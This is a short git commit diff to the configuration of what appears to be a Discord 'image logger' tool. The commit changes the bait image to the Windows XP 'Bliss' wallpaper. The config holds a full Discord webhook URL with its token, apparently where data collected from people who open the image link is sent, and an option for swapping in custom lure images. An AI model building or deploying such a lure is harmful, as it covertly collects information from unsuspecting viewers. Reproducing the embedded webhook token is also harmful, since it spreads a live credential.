c6ed30414977457102baba41f73c40c02f2534fc
zootywooty <puggyboylife@gmail.com>
2025-05-17 21:03:55 -0700

    Update image.py

--- API/image.py
+++ API/image.py
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1373498128333799598/CQrZ_Xiq-v6SIsTgxzey5Hw-0P3SJvGEjFGeDjnLmBx2IgXQ4mKwkQIwtlmFKWWJo6Dm",
-    "image": "https://tenor.com/view/bliss-windows-xp-relaxing-relax-cloud-gif-27700262", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
